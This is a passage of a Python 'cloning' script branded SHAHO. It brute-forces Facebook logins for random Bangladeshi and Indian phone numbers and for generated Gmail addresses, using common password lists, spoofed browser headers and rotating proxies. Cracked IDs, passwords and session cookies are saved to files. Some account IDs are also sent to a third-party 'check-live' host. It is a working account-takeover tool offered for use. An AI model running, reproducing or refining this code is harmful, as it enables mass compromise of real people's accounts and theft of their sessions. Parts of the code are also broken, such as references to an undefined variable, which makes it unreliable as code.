                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{W}<|{G}SHAHO-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/SHAHO-M1-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#--------------------• FILE METHOD M2 •--------------------#
def ___M2___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}FILE-M2{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            ses.headers.update({"Host":'m.facebook.com',
            "upgrade-insecure-requests":"1",
            "user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "dnt":"1","x-requested-with":"mark.via.gp",
            "sec-fetch-site":"same-origin","sec-fetch-mode":"cors",
            "sec-fetch-user":"empty",
            "sec-fetch-dest":"document",
            "referer":"https://m.facebook.com/",
            "accept-encoding":"gzip, deflate br",
            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}SHAHO-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/SHAHO-M2-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                oks+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{W}<|{G}SHAHO-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/SHAHO-M2-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#--------------------• RANDOM MENU •--------------------#
def ___randomx___():
	clear();print(f"{xd1} START BANGLADESH RANDOM CLONING ");print(f"{xd2} START INDIA RANDOM CLONING ");print(f"{xd0} EXIT CLONING ");linex();chude = input(f'{xdx} SELECT {xdxx} ')
	if chude in ["1"]:___Bangladesh___()
	elif chude in ["2"]:___India___()
	elif chude in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN SAWAR NATI");time.sleep(1);___randomx___()
#--------------------• RANDOM BANGLADESH •--------------------#
def ___Bangladesh___():
	clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}|{W} 019 {G}|{W} 018 {G}|{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ');clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}|{W} 5000 {G}|{W} 9999 {G}|{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '));clear();print(f"{xd1} METHOD M1 ");print(f"{xd2} METHOD M2 ");linex();methd = input(f'{xdx} SELECT {xdxx} ')
	for bal in range(limit):SHAHO = ''.join(random.choice(string.digits) for _ in range(8));user.append(SHAHO)
	with tred(max_workers=40) as __X__:
		clear();tl = str(len(user))
		print(f"{xd} CODE{G}|{W}UID {xdxx} {code}{G}|{W}{tl} ");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love
			pasx = [love,ids,ids[:8],ids[:7],'suraiya','mimmim','jannat','mariya','freefire','garena','405060','708090','tammana','i love ff','ff lover','gf=garena freefire']
			if methd in ["1"]:__X__.submit(__M1__,ids,pasx)
			elif methd in ["2"]:__X__.submit(__M2__,ids,pasx)
#--------------------• RANDOM INDIA •--------------------#
def ___India___():
	clear();print(f"{xd} EXAMPLE {xdxx} +91639 {G}|{W} +91645 {G}|{W} +91623 {G}|{W} +91632");linex();code = input(f'{xdx} SELECT  {xdxx} ');clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}|{W} 5000 {G}|{W} 9999 {G}|{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '));clear();print(f"{xd1} METHOD M1 ");print(f"{xd2} METHOD M2 ");linex();methd = input(f'{xdx} SELECT {xdxx} ')
	for bal in range(limit):SHAHO = ''.join(random.choice(string.digits) for _ in range(7));user.append(SHAHO)
	with tred(max_workers=30) as __X__:
		clear();tl = str(len(user))
		print(f"{xd} CODE{G}|{W}UID {xdxx} {code}{G}|{W}{tl} ");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
			ids = code + love
			pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
			if methd in ["1"]:__X__.submit(__M1__,ids,pasx)
			elif methd in ["2"]:__X__.submit(__M2__,ids,pasx)
#--------------------• RANDOM GMAIL •--------------------#
def ___gamilx___():
	ids=[]
	clear();clear();print(f"{xd} EXAMPLE {xdxx} sakib {G}|{W} rakib {G}|{W} habib {G}|{W} sabbir");linex();first = input(f'{xdx} SELECT  {xdxx} ');clear();print(f"{xd} EXAMPLE {xdxx} khan {G}|{W} ahmed {G}|{W} Islam {G}|{W} hossain");linex();last = input(f'{xdx} SELECT  {xdxx} ');clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}|{W} 5000 {G}|{W} 9999 {G}|{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '));clear();print(f"{xd1} METHOD M1 ");print(f"{xd2} METHOD M2 ");linex();methd = input(f'{xdx} SELECT {xdxx} ')
	domain = '@gmail.com'
	tkk = first+last
	for nmbr in range(limit):nmp = ''.join(random.choice(string.digits) for _ in range(3));ids.append(nmp)
	with tred(max_workers=40) as __sex__:
		clear();idx = str(len(ids))
		tk = first+last
		print(f"{xd} UID{G}|{W}NAME {xdxx} {idx}{G}|{W}{first}{last}{domain}");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for number in ids:
			ids = first+'.'+last+number+domain
			pasx = [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
			if methd in ["1"]:__sex__.submit(__M1__,ids,pasx)
			if methd in ["2"]:__sex__.submit(__M2__,ids,pasx)
#--------------------• RANDOM & GMAIL METHOD M1 •--------------------#
def __M1__(ids,pasx):
	global loop,oks,cps
	sys.stdout.write(f'\r{W}<|{G}RNDM-M1{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
	ewe = requests.Session()
	ua = random.choice(ugen)
	for pw in pasx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {
					'http': 'socks4://'+random.choice(xx)
					}
					
			link = ewe.get("https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": ids,
				"prefill_contact_point": ids,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			headers = {
				"Host": "p.facebook.com",
				"content-length": str(len((data))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": windows(),
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://p.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f'\r{W}<|{R}SHAHO-CP{W}|>{R} {uid} | {pw} ')
				cps+=1
				open('/sdcard/SHAHO-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
				if "LIVE" in response:
					print(f'\r{W}<|{G}SHAHO-OK{W}|>{G} {uid} | {pw} ')
					#print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
					oks+=1
					open('/sdcard/SHAHO-M1-RANDOM-OK-COKIE.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
					break
				else:continue
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#--------------------• RANDOM & GMAIL METHOD M2 •--------------------#
def __M2__(ids,pasx):
        global loop,oks,cps
        sys.stdout.write(f'\r{W}<|{G}RNDM-M2{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': windows(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'grapn.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{W}<|{G}SHAHO-OK{W}|>{G} {str(uid)} | {pas} ')
                                	#print(f'\r{W}<|{G}COOKIES{W}|>{W} {coki} ');linex()
                                	open('/sdcard/SHAHO-M2-RANDOM-OK-COKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	oks.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{W}<|{R}SHAHO-CP{W}|>{R} {str(uid)} | {pas} ')
                                open('/sdcard/SHAHO-M2-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#--------------------• END •--------------------#
if __name__ == '__main__':
	___SHAHO___()